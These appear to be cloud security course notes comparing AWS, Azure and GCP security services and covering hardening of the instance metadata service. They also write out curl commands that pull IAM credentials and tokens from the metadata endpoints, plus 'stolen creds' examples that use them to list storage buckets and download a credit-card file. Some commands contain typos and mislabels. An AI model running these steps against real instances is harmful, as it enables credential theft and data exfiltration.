| AWS Security Services            | Azure Security Services         | GCP Security Services            |
|-----------------------------------|---------------------------------|----------------------------------|
| 1. AWS Identity and Access Management (IAM) | 1. Azure Active Directory (AAD) | 1. Cloud Identity and Access Management (IAM) |
| 2. AWS Organizations             | 2. Azure Policy                | 2. GCP Organization Policy       |
| 3. AWS Resource Access Manager (RAM) | 3. Azure Resource Locks       | 3. GCP Resource Manager          |
| 4. AWS Security Token Service (STS) | 4. Azure Managed Identities   | 4. GCP Secret Manager            |
| 5. AWS Key Management Service (KMS) | 5. Azure Key Vault            | 5. Google Cloud KMS              |
| 6. AWS Secrets Manager          | 6. Azure Private Link          | 6. GCP VPC Service Controls      |
| 7. AWS Single Sign-On (SSO)     | 7. Azure AD B2C               | 7. GCP Identity Platform          |
| 8. AWS Cognito                  | 8. Azure AD Domain Services    | 8. GCP Identity-Aware Proxy (IAP) |
| 9. AWS GuardDuty                | 9. Azure Sentinel              | 9. GCP Event Threat Detection    |
| 10. AWS Inspector               | 10. Azure Security Center      | 10. GCP Security Command Center   |
| 11. AWS Shield                  | 11. Azure DDoS Protection      | 11. GCP Cloud Armor              |
| 12. AWS Web Application Firewall (WAF) | 12. Azure Web Application Firewall | 12. GCP Cloud CDN Security Policies |
| 13. AWS Firewall Manager        | 13. Azure Firewall Manager     | 13. GCP Firewall Rules Logging    |
| 14. AWS Certificate Manager (ACM) | 14. Azure App Service Certificates | 14. GCP Managed SSL Certificates |
| 15. AWS CloudTrail              | 15. Azure Monitor              | 15. GCP Cloud Audit Logs         |
| 16. AWS Config                  | 16. Azure Log Analytics        | 16. GCP Security Scanner          |
| 17. AWS CloudWatch              | 17. Azure Network Watcher      | 17. GCP Network Intelligence Center |
| 18. AWS Trusted Advisor         | 18. Azure Advisor              | 18. GCP Recommender              |


# Guides, Guidelines, 
CSA - Cloud control matrix - https://cloudsecurityalliance.org/research/cloud-controls-matrix/
CIS benchmark guide for individual clouds
Cloud center of excellence (CCoE)
Mitre ATT&CK Cloud matrix - https://attack.mitre.org/matrices/enterprise/cloud/

## Notes
- VM Service accounts/Instance Metadata Service (IMDS) - EC2 - Instance profile, Azure - Managed identity, GCP - Service account
- Turn off Metadata service if the application does not use it. Setting http-endpoint to disabled will turn off access to the IMDS’s HTTP endpoint. Access to Azure’s IMDS can be restricted using a network security rule. For GCP, you must explicitly turn off IMDS v0.1 and v1beta1 using the disable-legacy-endpoints directive. AWS enhances security by setting a metadata token's IP packet TTL to 1, ensuring it's not routed beyond the requesting EC2 instance.
- Limit the IP hops token responses to 1 (AWS only) - 

##### AWS
- Get security group ```curl –s "http://169.254.169.254/latest/meta-data/securitygroups/"```
- List of security creds saved in AWS - ```http://169.254.169.254/latest/meta-data/iam/security-credentials/```
- Get AUTH token ```TOKEN=$(curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds:21600" http://169.254.169.254/latest/api/token)```
- Use AUTH token in the request ```curl -H "X-aws-ec2-metadata-token: $TOKEN"http://169.254.169.254/latest/meta-data/iam/security-credentials/sec510-ec2```
- AWS AUTH using stlen creds
```
$ export AWS_ACCESS_KEY_ID="ASIA54BL6PJR3MV6PUNZ"
$ export AWS_SECRET_ACCESS_KEY="S0M6vF4UmMlfmV5B/bM2lTzocsSWMMHRI"
$ export AWS_SESSION_TOKEN="IQoJb3JpZjEJ...3QtMSJEQCIykQYitLv8Vg=="

$ aws s3api list-buckets
```
- Turning off the AWS IMDSv1 endpoint, requiring tokens and setting the hop limit:
```
resource "aws_instance" "sec510" {
  ami = data.aws_ami.ubuntu.id
  instance_type = "t2.micro"
  metadata_options {
    http_endpoint = "enabled"
    http_tokens = "required"
    http_put_response_hop_limit = 1
  }
}
```
##### Azure 
- JWT for accessing the storage service ```curl "http://169.254.169.254/metadata/identity/oauth2/token?apiversion=2018-02-01&resource=https://storage.azure.com/" -H "Metadata: true"```
- Azure authentication using stolen credentials
```
export BEARER_TOKEN=eyJ0eXAiOiJKV1iJSUzI1.eyJhdWQiOiJodHRwczovL6nF.9GBdAVCbC...d4EjV2m_ADfn7g9BoDsK9ID-18fvQKuQ
curl -s -H "Authorization: Bearer $BEARER_TOKEN" -H "x-ms-version:2017-11-09" "https://sec510.blob.core.windows.net/credit-cards?restype=container&comp=list"
curl -s -H "Authorization: Bearer $BEARER_TOKEN" -H "x-ms-version:2017-11-09" "https://sec510.blob.core.windows.net/creditcards/alice.txt" --output /tmp/alice.txt
```

##### GCP
- Get network security group ```curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/machine-type```
- Get access token (depricated but might work) ```curl "http://metadata.google.internal/0.1/meta-data/serviceaccounts/default/acquire"```
- Get access token (beta, might not work) ```curl "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"```
- Get service token ```curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/serviceaccounts/default/token```
- Get the scope of service token - ```http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes```
- GCP AUTH with stolen creds
```
$ export BEARER_TOKEN=ya29.c.Km7HBzaPr3J...WPBCgyiwPr5JESV16SHoh2w
# List all storage buckets in the GCP project
$ curl -s -H "Authorization: Bearer $BEARER _TOKEN" "https://storage.googleapis.com/storage/v1/b?project=sec510"
# Download an object from the bucket.
$ curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://www.googleapis.com/storage/v1/b/creditcards/o/alice.txt?alt=media" --output ~/tmp/alice.txt
```
